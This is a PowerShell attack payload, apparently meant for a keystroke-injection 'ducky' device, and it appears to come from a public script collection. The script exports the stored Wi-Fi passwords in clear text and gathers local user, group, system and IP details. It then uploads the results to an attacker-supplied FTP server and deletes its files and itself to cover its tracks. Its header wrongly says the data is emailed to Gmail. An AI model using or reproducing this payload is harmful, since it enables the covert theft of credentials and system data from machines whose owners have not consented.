# Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
# Description: Powershell Script to collect data on the local machine and email it to a external source (Gmail)

# !! CHANGES REQUIRED !!
# <FTP_SERVER> - IP/PORT of the FTP server you want to upload to 
# Credentials if anonymous is not enabled

# Set Directory
$path = "C:\temp\234f23"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
Set-Location $path
$filename = '23rtg4t.txt'

# Get Wi-Fi Known Networks OutFile $filename
netsh wlan export profile key=clear
Get-ChildItem *.xml |ForEach-Object {
$xml=[xml] (get-content $_)
$a= "*******************************`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File $filename -Append -InputObject $a
}

# Enumerate local system information
Get-LocalUser | Out-File -Append $filename
Get-LocalGroup | Out-File -Append $filename
Get-Computerinfo | Out-File -Append $filename
Get-NetIPAddress | Out-File -Append $filename

# FTP file prep
$server = '<FTP_SERVER>'
$ftp = [System.Net.FtpWebRequest]::Create("ftp://$server/$filename")
$ftp = [System.Net.FtpWebRequest]$ftp
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = new-object System.Net.NetworkCredential("anonymous","anonymous@$server")
$content = [System.IO.File]::ReadAllBytes("$path\$filename")
$ftp.ContentLength = $content.Length
$ftp.UseBinary = $true
$ftp.UsePassive = $true

$content = [System.IO.File]::ReadAllBytes("$path\$filename")
$ftp.ContentLength = $content.Length

# Send file
$rs = $ftp.GetRequestStream()
$rs.Write($content, 0, $content.Length)
$rs.Close()
$rs.Dispose()
# Clear tracks
Set-location 'C:\'
Remove-Item -Path 'C:\temp\234f23' -Recurse -Force

# remove ducky payload
Remove-Item 2643.ps1
